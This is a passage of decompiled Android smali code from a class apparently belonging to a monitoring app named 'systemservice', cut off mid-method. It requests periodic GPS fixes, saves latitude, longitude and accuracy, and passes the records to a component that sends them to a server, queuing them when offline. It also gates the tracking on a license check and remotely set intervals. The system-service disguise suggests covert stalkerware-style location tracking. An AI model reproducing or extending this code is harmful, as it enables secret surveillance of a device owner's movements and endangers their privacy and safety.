.class public Lcom/systemservice/common/features/gpsHistory/d;
.super Lcom/systemservice/a/d/a;
.source ""


# static fields
.field private static final d:[Ljava/lang/String;

.field public static e:Z


# instance fields
.field private f:Lcom/google/android/gms/location/b;

.field private g:Lcom/google/android/gms/location/e;

.field private h:Z

.field private i:Landroid/location/Location;

.field private j:Lorg/apache/log4j/Logger;

.field private k:Lcom/google/android/gms/location/LocationRequest;

.field private l:J

.field private m:Z

.field private n:Landroid/location/Location;

.field private o:Z

.field private p:Landroid/content/Context;

.field private q:Z


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const/4 v0, 0x0

    new-array v1, v0, [Ljava/lang/String;

    sput-object v1, Lcom/systemservice/common/features/gpsHistory/d;->d:[Ljava/lang/String;

    sput-boolean v0, Lcom/systemservice/common/features/gpsHistory/d;->e:Z

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Ljava/lang/String;Lcom/systemservice/common/features/settingHistory/b;Lcom/systemservice/a/h/i;)V
    .locals 3

    invoke-direct {p0}, Lcom/systemservice/a/d/a;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/systemservice/common/features/gpsHistory/d;->h:Z

    const-wide/16 v1, 0x5

    iput-wide v1, p0, Lcom/systemservice/common/features/gpsHistory/d;->l:J

    iput-boolean v0, p0, Lcom/systemservice/common/features/gpsHistory/d;->m:Z

    const/4 v1, 0x0

    iput-object v1, p0, Lcom/systemservice/common/features/gpsHistory/d;->n:Landroid/location/Location;

    iput-boolean v0, p0, Lcom/systemservice/common/features/gpsHistory/d;->o:Z

    iput-boolean v0, p0, Lcom/systemservice/common/features/gpsHistory/d;->q:Z

    const-string v1, "gps_active"

    invoke-static {p1, v1, v0}, Lcom/systemservice/a/a/l;->a(Landroid/content/Context;Ljava/lang/String;Z)Z

    move-result v0

    iput-boolean v0, p0, Lcom/systemservice/common/features/gpsHistory/d;->q:Z

    iput-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->p:Landroid/content/Context;

    iput-object p2, p0, Lcom/systemservice/a/d/a;->c:Ljava/lang/String;

    invoke-virtual {p0, p3}, Lcom/systemservice/a/d/g;->a(Lcom/systemservice/common/features/settingHistory/b;)V

    invoke-virtual {p0, p4}, Lcom/systemservice/a/d/g;->a(Lcom/systemservice/a/h/b;)V

    const-string p2, "AndroidGpsWatcherGLService"

    invoke-static {p2}, Lcom/systemservice/a/e/m;->a(Ljava/lang/String;)Lorg/apache/log4j/Logger;

    move-result-object p2

    iput-object p2, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    invoke-static {p1}, Lcom/google/android/gms/location/g;->a(Landroid/content/Context;)Lcom/google/android/gms/location/b;

    move-result-object p1

    iput-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->f:Lcom/google/android/gms/location/b;

    return-void
.end method

.method static synthetic a(Lcom/systemservice/common/features/gpsHistory/d;Landroid/location/Location;)Landroid/location/Location;
    .locals 0

    iput-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->i:Landroid/location/Location;

    return-object p1
.end method

.method private a(Landroid/content/Context;Landroid/location/Location;)Lcom/systemservice/a/e/j;
    .locals 12

    const-string v0, "gps"

    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p1

    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    invoke-virtual {p2}, Landroid/location/Location;->getLatitude()D

    move-result-wide v0

    double-to-float v0, v0

    const-string v1, "current_latitude"

    invoke-interface {p1, v1, v0}, Landroid/content/SharedPreferences$Editor;->putFloat(Ljava/lang/String;F)Landroid/content/SharedPreferences$Editor;

    invoke-virtual {p2}, Landroid/location/Location;->getLongitude()D

    move-result-wide v0

    double-to-float v0, v0

    const-string v1, "current_longitude"

    invoke-interface {p1, v1, v0}, Landroid/content/SharedPreferences$Editor;->putFloat(Ljava/lang/String;F)Landroid/content/SharedPreferences$Editor;

    invoke-virtual {p2}, Landroid/location/Location;->getAccuracy()F

    move-result v0

    const-string v1, "current_accurate"

    invoke-interface {p1, v1, v0}, Landroid/content/SharedPreferences$Editor;->putFloat(Ljava/lang/String;F)Landroid/content/SharedPreferences$Editor;

    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V

    invoke-virtual {p2}, Landroid/location/Location;->getLongitude()D

    move-result-wide v0

    invoke-static {v0, v1}, Ljava/lang/String;->valueOf(D)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {p2}, Landroid/location/Location;->getLatitude()D

    move-result-wide v0

    invoke-static {v0, v1}, Ljava/lang/String;->valueOf(D)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {p2}, Landroid/location/Location;->getAccuracy()F

    move-result p1

    float-to-double v9, p1

    invoke-virtual {p2}, Landroid/location/Location;->getTime()J

    move-result-wide p1

    const-wide/16 v0, 0x3e8

    div-long v5, p1, v0

    new-instance p1, Lcom/systemservice/a/e/j;

    const-wide/16 v3, 0x0

    const-string v11, ""

    move-object v2, p1

    invoke-direct/range {v2 .. v11}, Lcom/systemservice/a/e/j;-><init>(JJLjava/lang/String;Ljava/lang/String;DLjava/lang/String;)V

    return-object p1
.end method

.method private a(Landroid/content/Context;Lcom/systemservice/a/h/i;)V
    .locals 2

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/systemservice/common/features/gpsHistory/b;

    invoke-direct {v1, p0, p2, p1}, Lcom/systemservice/common/features/gpsHistory/b;-><init>(Lcom/systemservice/common/features/gpsHistory/d;Lcom/systemservice/a/h/i;Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private a(Ljava/lang/Long;Ljava/lang/Long;)V
    .locals 4

    iget-object v0, p0, Lcom/systemservice/common/features/gpsHistory/d;->p:Landroid/content/Context;

    const-string v1, "android.permission.ACCESS_FINE_LOCATION"

    invoke-static {v0, v1}, Landroid/support/v4/content/a;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/systemservice/common/features/gpsHistory/d;->p:Landroid/content/Context;

    const-string v2, "android.permission.ACCESS_COARSE_LOCATION"

    invoke-static {v0, v2}, Landroid/support/v4/content/a;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_0

    iget-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->p:Landroid/content/Context;

    check-cast p1, Landroid/app/Activity;

    filled-new-array {v1, v2}, [Ljava/lang/String;

    move-result-object p2

    const/16 v0, 0x3e8

    invoke-static {p1, p2, v0}, Landroid/support/v4/app/b;->a(Landroid/app/Activity;[Ljava/lang/String;I)V

    goto :goto_0

    :cond_0
    invoke-static {}, Lcom/google/android/gms/location/LocationRequest;->i()Lcom/google/android/gms/location/LocationRequest;

    move-result-object v0

    iput-object v0, p0, Lcom/systemservice/common/features/gpsHistory/d;->k:Lcom/google/android/gms/location/LocationRequest;

    iget-object v0, p0, Lcom/systemservice/common/features/gpsHistory/d;->k:Lcom/google/android/gms/location/LocationRequest;

    const/16 v1, 0x66

    invoke-virtual {v0, v1}, Lcom/google/android/gms/location/LocationRequest;->b(I)Lcom/google/android/gms/location/LocationRequest;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "interval = "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v1, "fastTestInterval = "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "GpsWatcherGLService"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lcom/systemservice/common/features/gpsHistory/d;->k:Lcom/google/android/gms/location/LocationRequest;

    invoke-virtual {p1}, Ljava/lang/Long;->longValue()J

    move-result-wide v1

    invoke-virtual {v0, v1, v2}, Lcom/google/android/gms/location/LocationRequest;->b(J)Lcom/google/android/gms/location/LocationRequest;

    iget-object v0, p0, Lcom/systemservice/common/features/gpsHistory/d;->k:Lcom/google/android/gms/location/LocationRequest;

    invoke-virtual {p2}, Ljava/lang/Long;->longValue()J

    move-result-wide v1

    invoke-virtual {v0, v1, v2}, Lcom/google/android/gms/location/LocationRequest;->a(J)Lcom/google/android/gms/location/LocationRequest;

    iget-object p2, p0, Lcom/systemservice/common/features/gpsHistory/d;->k:Lcom/google/android/gms/location/LocationRequest;

    invoke-virtual {p1}, Ljava/lang/Long;->longValue()J

    move-result-wide v0

    const-wide/32 v2, 0xea60

    add-long/2addr v0, v2

    invoke-virtual {p2, v0, v1}, Lcom/google/android/gms/location/LocationRequest;->c(J)Lcom/google/android/gms/location/LocationRequest;

    iget-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->k:Lcom/google/android/gms/location/LocationRequest;

    const/4 p2, 0x0

    invoke-virtual {p1, p2}, Lcom/google/android/gms/location/LocationRequest;->a(F)Lcom/google/android/gms/location/LocationRequest;

    new-instance p1, Lcom/systemservice/common/features/gpsHistory/c;

    invoke-direct {p1, p0}, Lcom/systemservice/common/features/gpsHistory/c;-><init>(Lcom/systemservice/common/features/gpsHistory/d;)V

    iput-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->g:Lcom/google/android/gms/location/e;

    iget-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->f:Lcom/google/android/gms/location/b;

    iget-object p2, p0, Lcom/systemservice/common/features/gpsHistory/d;->k:Lcom/google/android/gms/location/LocationRequest;

    iget-object v0, p0, Lcom/systemservice/common/features/gpsHistory/d;->g:Lcom/google/android/gms/location/e;

    const/4 v1, 0x0

    invoke-virtual {p1, p2, v0, v1}, Lcom/google/android/gms/location/b;->a(Lcom/google/android/gms/location/LocationRequest;Lcom/google/android/gms/location/e;Landroid/os/Looper;)Lb/b/a/a/f/h;

    :goto_0
    return-void
.end method

.method static synthetic a(Lcom/systemservice/common/features/gpsHistory/d;)Z
    .locals 0

    iget-boolean p0, p0, Lcom/systemservice/common/features/gpsHistory/d;->o:Z

    return p0
.end method

.method static synthetic a(Lcom/systemservice/common/features/gpsHistory/d;Z)Z
    .locals 0

    iput-boolean p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->o:Z

    return p1
.end method

.method static synthetic b(Lcom/systemservice/common/features/gpsHistory/d;)V
    .locals 0

    invoke-direct {p0}, Lcom/systemservice/common/features/gpsHistory/d;->g()V

    return-void
.end method

.method static synthetic c(Lcom/systemservice/common/features/gpsHistory/d;)Lorg/apache/log4j/Logger;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    return-object p0
.end method

.method private g()V
    .locals 7

    const-string v0, " - "

    const-string v1, "Location: "

    iget-object v2, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    const-string v3, "displayLocation()"

    invoke-virtual {v2, v3}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x17

    if-lt v2, v3, :cond_0

    iget-object v2, p0, Lcom/systemservice/common/features/gpsHistory/d;->p:Landroid/content/Context;

    const-string v3, "android.permission.ACCESS_FINE_LOCATION"

    invoke-static {v2, v3}, Landroid/support/v4/content/a;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v2

    if-eqz v2, :cond_0

    iget-object v0, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    const-string v1, "permissionCheck GPS = false"

    invoke-virtual {v0, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    return-void

    :cond_0
    :try_start_0
    iget-object v2, p0, Lcom/systemservice/common/features/gpsHistory/d;->i:Landroid/location/Location;

    if-eqz v2, :cond_2

    iget-object v2, p0, Lcom/systemservice/common/features/gpsHistory/d;->p:Landroid/content/Context;

    iget-object v3, p0, Lcom/systemservice/common/features/gpsHistory/d;->i:Landroid/location/Location;

    invoke-direct {p0, v2, v3}, Lcom/systemservice/common/features/gpsHistory/d;->a(Landroid/content/Context;Landroid/location/Location;)Lcom/systemservice/a/e/j;

    move-result-object v2

    if-eqz v2, :cond_2

    iget-object v3, p0, Lcom/systemservice/common/features/gpsHistory/d;->p:Landroid/content/Context;

    invoke-static {v3}, Lcom/systemservice/common/features/settingHistory/b;->c(Landroid/content/Context;)Z

    move-result v3

    if-nez v3, :cond_1

    iget-object v0, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    const-string v1, "No internet: Append GPS Record"

    invoke-virtual {v0, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-object v0, p0, Lcom/systemservice/a/d/g;->b:Lcom/systemservice/a/h/b;

    check-cast v0, Lcom/systemservice/a/h/i;

    invoke-virtual {v0, v2}, Lcom/systemservice/a/h/i;->a(Lcom/systemservice/a/e/j;)V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/systemservice/a/a/j;->c:Z

    goto :goto_0

    :cond_1
    iget-object v3, p0, Lcom/systemservice/a/d/g;->b:Lcom/systemservice/a/h/b;

    check-cast v3, Lcom/systemservice/a/h/i;

    invoke-virtual {v3, v2}, Lcom/systemservice/a/h/i;->a(Lcom/systemservice/a/e/j;)V

    const-string v4, "GpsWatcherGLService"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v6, v2, Lcom/systemservice/a/e/j;->c:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v6, v2, Lcom/systemservice/a/e/j;->d:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v4, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    const-string v5, "Send GPS To Server"

    invoke-virtual {v4, v5}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-object v4, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v1, v2, Lcom/systemservice/a/e/j;->c:Ljava/lang/String;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v0, v2, Lcom/systemservice/a/e/j;->d:Ljava/lang/String;

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-object v0, p0, Lcom/systemservice/common/features/gpsHistory/d;->p:Landroid/content/Context;

    invoke-direct {p0, v0, v3}, Lcom/systemservice/common/features/gpsHistory/d;->a(Landroid/content/Context;Lcom/systemservice/a/h/i;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    iget-object v1, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, ""

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    :cond_2
    :goto_0
    return-void
.end method


# virtual methods
.method public a(Lcom/systemservice/a/b/a;)V
    .locals 12

    const-string v0, "GpsWatcherGLService"

    invoke-super {p0, p1}, Lcom/systemservice/a/d/a;->a(Lcom/systemservice/a/b/a;)V

    :try_start_0
    iget-object v1, p0, Lcom/systemservice/common/features/gpsHistory/d;->p:Landroid/content/Context;

    const-string v2, "is_waiting_for_stop"

    const/4 v3, 0x0

    invoke-static {v1, v2, v3}, Lcom/systemservice/a/a/l;->a(Landroid/content/Context;Ljava/lang/String;Z)Z

    move-result v1

    if-eqz v1, :cond_0

    iget-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    const-string v1, "is_waiting_stop = true"

    invoke-virtual {p1, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    return-void

    :cond_0
    invoke-virtual {p1}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object v1

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x17

    if-lt v2, v4, :cond_1

    const-string v2, "android.permission.ACCESS_FINE_LOCATION"

    invoke-static {v1, v2}, Landroid/support/v4/content/a;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v2

    if-eqz v2, :cond_1

    iget-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    const-string v1, "permissionCheck GPS = false"

    invoke-virtual {p1, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    return-void

    :cond_1
    iget-boolean v2, p0, Lcom/systemservice/common/features/gpsHistory/d;->q:Z

    if-nez v2, :cond_2

    iget-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    const-string v1, "is_gps_active = false"

    invoke-virtual {p1, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    return-void

    :cond_2
    const-string v2, "app_prefs_settings"

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    invoke-static {v1}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_3

    iget-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    const-string v1, "checkLicenseExpired = true"

    invoke-virtual {p1, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    return-void

    :cond_3
    invoke-virtual {p1}, Lcom/systemservice/a/b/a;->b()Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p1

    if-eqz p1, :cond_7

    const-string v1, "com.sc.start.location"

    invoke-virtual {v1, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_7

    iget-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    const-string v1, "START_LOCATION_ACTION = true"

    invoke-virtual {p1, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    const-string p1, "gps_interval"

    const-wide/16 v4, 0x1

    invoke-interface {v2, p1, v4, v5}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v1

    const-wide/16 v6, 0x3c

    div-long/2addr v1, v6

    sget-boolean p1, Lcom/systemservice/a/a/j;->k:Z

    if-eqz p1, :cond_4

    iget-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->f:Lcom/google/android/gms/location/b;

    if-eqz p1, :cond_4

    const-string p1, "IS_GetGPSNow"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    const-string v1, "IS_GetGPSNow = true"

    invoke-virtual {p1, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->f:Lcom/google/android/gms/location/b;

    invoke-virtual {p1}, Lcom/google/android/gms/location/b;->f()Lb/b/a/a/f/h;

    move-result-object p1

    new-instance v1, Lcom/systemservice/common/features/gpsHistory/a;

    invoke-direct {v1, p0}, Lcom/systemservice/common/features/gpsHistory/a;-><init>(Lcom/systemservice/common/features/gpsHistory/d;)V

    invoke-virtual {p1, v1}, Lb/b/a/a/f/h;->a(Lb/b/a/a/f/c;)Lb/b/a/a/f/h;

    goto/16 :goto_1

    :cond_4
    iget-boolean p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->m:Z

    const-wide/16 v6, 0x7530

    const-wide/32 v8, 0xea60

    if-eqz p1, :cond_5

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "GPS_Interval = "

    invoke-virtual {p1, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    const-string v10, "GPSFirst = true"

    invoke-virtual {p1, v10}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-wide v10, p0, Lcom/systemservice/common/features/gpsHistory/d;->l:J

    cmp-long p1, v10, v1

    if-eqz p1, :cond_7

    cmp-long p1, v1, v4

    if-eqz p1, :cond_7

    iput-wide v1, p0, Lcom/systemservice/common/features/gpsHistory/d;->l:J

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "UPDATE_INTERVAL = "

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-wide v1, p0, Lcom/systemservice/common/features/gpsHistory/d;->l:J

    invoke-virtual {p1, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iput-boolean v3, p0, Lcom/systemservice/common/features/gpsHistory/d;->h:Z

    iget-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->f:Lcom/google/android/gms/location/b;

    iget-object v1, p0, Lcom/systemservice/common/features/gpsHistory/d;->g:Lcom/google/android/gms/location/e;

    invoke-virtual {p1, v1}, Lcom/google/android/gms/location/b;->a(Lcom/google/android/gms/location/e;)Lb/b/a/a/f/h;

    iget-wide v1, p0, Lcom/systemservice/common/features/gpsHistory/d;->l:J

    mul-long v1, v1, v8

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p1

    iget-wide v1, p0, Lcom/systemservice/common/features/gpsHistory/d;->l:J

    mul-long v1, v1, v6

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    :goto_0
    invoke-direct {p0, p1, v1}, Lcom/systemservice/common/features/gpsHistory/d;->a(Ljava/lang/Long;Ljava/lang/Long;)V

    goto :goto_1

    :cond_5
    const/4 p1, 0x1

    iput-boolean p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->m:Z

    iput-boolean p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->h:Z

    iget-wide v10, p0, Lcom/systemservice/common/features/gpsHistory/d;->l:J

    cmp-long p1, v10, v1

    if-eqz p1, :cond_6

    cmp-long p1, v1, v4

    if-eqz p1, :cond_6

    iput-wide v1, p0, Lcom/systemservice/common/features/gpsHistory/d;->l:J

    :cond_6
    iget-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Load gps by time period: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-wide v2, p0, Lcom/systemservice/common/features/gpsHistory/d;->l:J

    invoke-virtual {v1, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-wide v1, p0, Lcom/systemservice/common/features/gpsHistory/d;->l:J

    mul-long v1, v1, v8

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p1

    iget-wide v1, p0, Lcom/systemservice/common/features/gpsHistory/d;->l:J

    mul-long v1, v1, v6

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, ""

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V

    :cond_7
    :goto_1
    return-void
.end method

.method public a(Lcom/systemservice/a/d/b;)V
    .locals 2

    invoke-super {p0, p1}, Lcom/systemservice/a/d/g;->a(Lcom/systemservice/a/d/b;)V

    invoke-virtual {p0}, Lcom/systemservice/a/d/g;->d()Lcom/systemservice/common/features/settingHistory/b;

    move-result-object p1

    iget-object v0, p0, Lcom/systemservice/common/features/gpsHistory/d;->p:Landroid/content/Context;

    invoke-virtual {p1, v0}, Lcom/systemservice/common/features/settingHistory/b;->d(Landroid/content/Context;)V

    iget-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->p:Landroid/content/Context;

    const-string v0, "gps_active"

    const/4 v1, 0x0

    invoke-static {p1, v0, v1}, Lcom/systemservice/a/a/l;->a(Landroid/content/Context;Ljava/lang/String;Z)Z

    move-result p1

    iput-boolean p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->q:Z

    iget-boolean p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->q:Z

    if-eqz p1, :cond_0

    iget-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    const-string v0, "is_gps_active = ON"

